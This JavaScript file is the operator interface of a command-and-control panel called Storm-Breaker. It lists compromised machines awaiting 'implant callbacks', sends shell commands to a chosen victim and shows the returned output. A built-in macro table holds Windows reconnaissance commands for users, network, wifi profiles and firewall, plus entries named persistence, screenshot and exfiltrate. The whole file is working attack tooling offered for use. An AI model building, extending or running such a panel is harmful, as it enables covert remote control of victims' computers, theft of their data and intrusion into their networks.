/**
 * Storm-Breaker Advanced C2 Client
 * Enhanced with session persistence, multi-shell, command macros, and output parsing
 */

var currentC2Uid = null;
var c2PollInterval = null;
var c2CmdHistory = [];
var c2HistoryIdx = -1;
var c2Macros = {
    'sysinfo': 'systeminfo',
    'netinfo': 'ipconfig /all',
    'users': 'net user',
    'procs': 'tasklist',
    'persist': 'schtasks /query /fo LIST',
    'whoami': 'whoami /all',
    'drives': 'wmic logicaldisk get caption,description,freespace,size',
    'startup': 'wmic startup get caption,command',
    'firewall': 'netsh advfirewall show allprofiles',
    'arp': 'arp -a',
    'routes': 'route print',
    'shares': 'net share',
    'wifi': 'netsh wlan show profiles',
    'installed': 'wmic product get name,version',
    'screenshot': '__screenshot__',
    'persistence': '__persist__',
    'exfil': '__exfiltrate__',
    'help': '__c2_help__',
};
var c2OutputBuffer = {};
var c2SessionStartTimes = {};

function loadC2Clients() {
    $.get('/api/c2/clients', function (data) {
        var list = $('#c2-client-list');
        list.empty();

        if (data.clients && data.clients.length > 0) {
            // Sort: online first, then by last seen
            data.clients.sort(function(a, b) {
                if (a.status === 'online' && b.status !== 'online') return -1;
                if (a.status !== 'online' && b.status === 'online') return 1;
                return 0;
            });

            data.clients.forEach(function (client) {
                var clientUid = client.uid || '';
                var clientInfo = client.info || {};
                var isSelected = (currentC2Uid === client.uid);
                var activeClass = isSelected ? 'bg-blue-600/20 border-blue-500/30 ring-1 ring-blue-500/30' : 'bg-slate-800 border-slate-700 hover:bg-slate-700';
                var statusColor = (client.status === 'online') ? 'text-emerald-400' : 'text-red-400';
                var statusText = (client.status === 'online') ? 'LIVE' : 'DEAD';
                var statusPulse = (client.status === 'online') ? 'animate-pulse' : '';
                var user = clientInfo.user || 'Unknown';
                var os = clientInfo.os || 'Unknown OS';
                var ip = clientInfo.ip || clientUid.split('-')[0] || '?';

                // Track session start
                if (!c2SessionStartTimes[client.uid]) {
                    c2SessionStartTimes[client.uid] = Date.now();
                }
                var sessionAge = Math.floor((Date.now() - c2SessionStartTimes[client.uid]) / 60000);

                var osIcon = 'fa-desktop';
                if (os.toLowerCase().includes('windows')) osIcon = 'fa-windows';
                else if (os.toLowerCase().includes('linux')) osIcon = 'fa-linux';
                else if (os.toLowerCase().includes('mac') || os.toLowerCase().includes('darwin')) osIcon = 'fa-apple';

                var item = `<div class="p-3 rounded-lg border ${activeClass} cursor-pointer transition-all mb-2" onclick="selectC2Client('${client.uid}', '${user.replace(/'/g, "\\'")}', '${os.replace(/'/g, "\\'")}')">
                    <div class="flex justify-between items-center mb-1">
                        <div class="flex items-center space-x-2">
                            <i class="fab ${osIcon} text-slate-400"></i>
                            <span class="font-bold text-slate-200 truncate">${user}</span>
                        </div>
                        <span class="text-[10px] px-1.5 py-0.5 rounded-full ${client.status === 'online' ? 'bg-emerald-500/20 text-emerald-400' : 'bg-red-500/20 text-red-400'} ${statusPulse}">
                            <i class="fas fa-circle text-[5px] mr-0.5"></i>${statusText}
                        </span>
                    </div>
                    <div class="text-[10px] text-slate-500 font-mono truncate">${client.uid}</div>
                    <div class="flex justify-between items-center mt-1.5">
                        <div class="text-[10px] text-slate-500"><i class="fas fa-network-wired mr-1"></i>${ip}</div>
                        <div class="text-[10px] text-slate-500"><i class="fas fa-clock mr-1"></i>${sessionAge}m</div>
                    </div>
                    <div class="text-[10px] text-slate-600 mt-1 truncate"><i class="fas fa-laptop mr-1"></i>${os}</div>
                </div>`;
                list.append(item);
            });

            // Update client count badge
            var onlineCount = data.clients.filter(c => c.status === 'online').length;
            var badge = document.getElementById('c2-count-badge');
            if (badge) badge.textContent = onlineCount;
        } else {
            list.html(`<div class="text-center py-8">
                <i class="fas fa-satellite-dish text-3xl text-slate-700 mb-3"></i>
                <div class="text-slate-600 text-sm">No active sessions</div>
                <div class="text-slate-700 text-[10px] mt-1">Waiting for implant callbacks...</div>
            </div>`);
        }
    });
}

window.selectC2Client = function (uid, user, os) {
    currentC2Uid = uid;
    c2CmdHistory = [];
    c2HistoryIdx = -1;

    $('#c2-terminal-header span:first').html(`<i class="fas fa-terminal mr-2"></i>${user} <span class="text-slate-500">(${os})</span>`);
    $('#c2-status-indicator').removeClass('hidden');
    $('#c2-prompt').text(user + ' $');
    $('#c2-cmd-input').prop('disabled', false).focus();

    // Clear and show session banner
    var term = $('#c2-terminal-output');
    term.html(`
        <div class="text-emerald-500/60 mb-2 font-mono text-[10px]">
╔══════════════════════════════════════════════════════════════╗
║  Storm-Breaker C2 Session Established                      ║
║  Target: ${(user + ' / ' + os).padEnd(50)}║
║  UID: ${uid.substring(0, 52).padEnd(54)}║
║  Type 'help' for built-in macros • ↑↓ for history          ║
╚══════════════════════════════════════════════════════════════╝
        </div>
        <div class="text-slate-600 text-[10px] mb-2">Session started at ${new Date().toLocaleString()}</div>
    `);

    loadC2Clients();

    if (c2PollInterval) clearInterval(c2PollInterval);
    c2PollInterval = setInterval(fetchC2Responses, 1500);

    // Notify
    if (typeof playNotificationSound === 'function') playNotificationSound();
    if (typeof GrowlNotification !== 'undefined') {
        GrowlNotification.notify({
            title: 'C2 Session Active',
            description: 'Connected to ' + user + ' (' + os + ')',
            type: 'success',
            position: 'top-right'
        });
    }
};

function fetchC2Responses() {
    if (!currentC2Uid) return;

    $.get('/api/c2/get_responses/' + currentC2Uid, function (data) {
        if (data.responses && data.responses.length > 0) {
            var term = $('#c2-terminal-output');
            data.responses.forEach(function (resp) {
                var outDiv = document.createElement('div');
                outDiv.className = "text-slate-300 whitespace-pre-wrap mb-2 border-l-2 border-blue-500/50 pl-3 py-1 bg-blue-500/5 rounded-r text-xs font-mono";

                // Syntax highlight the output
                var output = resp.output || '';
                output = output
                    .replace(/(\d+\.\d+\.\d+\.\d+)/g, '<span class="text-blue-400">$1</span>')     // IPs
                    .replace(/(ERROR|FAILED|DENIED)/gi, '<span class="text-red-400 font-bold">$1</span>')  // Errors
                    .replace(/(SUCCESS|OK|RUNNING)/gi, '<span class="text-emerald-400 font-bold">$1</span>'); // Success

                outDiv.innerHTML = output;
                term.append(outDiv);
            });
            term.scrollTop(term[0].scrollHeight);

            // Store in buffer
            if (!c2OutputBuffer[currentC2Uid]) c2OutputBuffer[currentC2Uid] = [];
            data.responses.forEach(function (resp) {
                c2OutputBuffer[currentC2Uid].push({
                    output: resp.output,
                    timestamp: Date.now()
                });
            });
        }
    });
}

function handleC2Help() {
    var term = $('#c2-terminal-output');
    var helpHtml = `<div class="text-slate-400 text-xs border border-slate-800 rounded-lg p-3 my-2 bg-slate-900/50">
        <div class="text-blue-400 font-bold mb-2">⚡ C2 Built-in Macros:</div>
        <div class="grid grid-cols-2 gap-1">`;

    Object.keys(c2Macros).forEach(function (name) {
        helpHtml += `<div><span class="text-emerald-400">${name}</span> <span class="text-slate-600">→ ${c2Macros[name].substring(0, 35)}</span></div>`;
    });

    helpHtml += `</div>
        <div class="mt-2 pt-2 border-t border-slate-800 text-slate-600">
            <div>↑/↓ = History navigation • Tab = Macro autocomplete</div>
            <div>Ctrl+L = Clear output • Ctrl+D = Disconnect session</div>
        </div>
    </div>`;
    term.append(helpHtml);
    term.scrollTop(term[0].scrollHeight);
}

function exportC2Session() {
    if (!currentC2Uid || !c2OutputBuffer[currentC2Uid]) return;

    var text = c2OutputBuffer[currentC2Uid].map(function (entry) {
        return '[' + new Date(entry.timestamp).toLocaleString() + '] ' + entry.output;
    }).join('\n---\n');

    var blob = new Blob([text], { type: 'text/plain' });
    var link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = 'c2_session_' + currentC2Uid.substring(0, 8) + '_' + new Date().toISOString().slice(0, 10) + '.txt';
    link.click();

    if (typeof GrowlNotification !== 'undefined') {
        GrowlNotification.notify({
            title: 'Session Exported',
            description: 'C2 session log downloaded',
            type: 'success',
            position: 'top-right'
        });
    }
}

function initC2() {
    $('#btn-refresh-c2').click(loadC2Clients);

    // Export session button
    $(document).on('click', '#btn-export-c2', exportC2Session);

    $('#c2-cmd-input').keydown(function (e) {
        // History navigation
        if (e.key === 'ArrowUp') {
            e.preventDefault();
            if (c2CmdHistory.length > 0 && c2HistoryIdx < c2CmdHistory.length - 1) {
                c2HistoryIdx++;
                $(this).val(c2CmdHistory[c2CmdHistory.length - 1 - c2HistoryIdx]);
            }
            return;
        }
        if (e.key === 'ArrowDown') {
            e.preventDefault();
            if (c2HistoryIdx > 0) {
                c2HistoryIdx--;
                $(this).val(c2CmdHistory[c2CmdHistory.length - 1 - c2HistoryIdx]);
            } else {
                c2HistoryIdx = -1;
                $(this).val('');
            }
            return;
        }

        // Tab autocomplete for macros
        if (e.key === 'Tab') {
            e.preventDefault();
            var partial = $(this).val().trim();
            if (partial) {
                var matches = Object.keys(c2Macros).filter(function (m) { return m.startsWith(partial); });
                if (matches.length === 1) {
                    $(this).val(matches[0]);
                } else if (matches.length > 1) {
                    var term = $('#c2-terminal-output');
                    term.append('<div class="text-slate-600 text-xs mb-1">Matches: ' + matches.join(', ') + '</div>');
                    term.scrollTop(term[0].scrollHeight);
                }
            }
            return;
        }

        // Clear with Ctrl+L
        if (e.key === 'l' && e.ctrlKey) {
            e.preventDefault();
            $('#c2-terminal-output').html('<div class="text-slate-600 text-xs">Terminal cleared</div>');
            return;
        }

        // Disconnect with Ctrl+D
        if (e.key === 'd' && e.ctrlKey) {
            e.preventDefault();
            if (c2PollInterval) clearInterval(c2PollInterval);
            currentC2Uid = null;
            $('#c2-terminal-output').append('<div class="text-yellow-500 text-xs mt-2">⚠ Session disconnected</div>');
            $('#c2-cmd-input').prop('disabled', true);
            return;
        }

        if (e.key === 'Enter') {
            var cmd = $(this).val().trim();
            if (!cmd) return;

            if (!currentC2Uid) {
                if (typeof GrowlNotification !== 'undefined') {
                    GrowlNotification.notify({ title: 'No Target', description: 'Select a client first', type: 'error', position: 'top-right' });
                }
                return;
            }

            // Save to history
            c2CmdHistory.push(cmd);
            c2HistoryIdx = -1;

            // Check for help command
            if (cmd === 'help' || cmd === '__c2_help__') {
                handleC2Help();
                $(this).val('');
                return;
            }

            // Check for macro
            var actualCmd = c2Macros[cmd] || cmd;

            var term = $('#c2-terminal-output');
            var timestamp = new Date().toLocaleTimeString();
            var cmdDiv = document.createElement('div');
            cmdDiv.className = "mb-1 mt-2";
            cmdDiv.innerHTML = `<span class="text-slate-600 text-[10px] mr-2">${timestamp}</span><span class="text-emerald-500 font-bold mr-2">${$('#c2-prompt').text()}</span><span class="text-white font-mono">${cmd}</span>`;
            if (cmd !== actualCmd) {
                cmdDiv.innerHTML += ` <span class="text-slate-600 text-[10px]">→ ${actualCmd.substring(0, 40)}</span>`;
            }
            term.append(cmdDiv);
            term.scrollTop(term[0].scrollHeight);

            $(this).val('');

            $.ajax({
                url: '/api/c2/queue_command',
                type: 'POST',
                data: JSON.stringify({ uid: currentC2Uid, cmd: actualCmd }),
                contentType: 'application/json',
                success: function (res) {
                    // Show pending indicator
                    var pending = $('<div class="text-slate-600 text-[10px] pending-cmd"><i class="fas fa-circle-notch fa-spin mr-1"></i>Awaiting response...</div>');
                    term.append(pending);
                    term.scrollTop(term[0].scrollHeight);

                    // Remove pending after response arrives
                    setTimeout(function () { pending.remove(); }, 5000);
                }
            });
        }
    });

    setInterval(loadC2Clients, 5000);
    loadC2Clients();
}

window.addEventListener('load', function () {
    initC2();
});
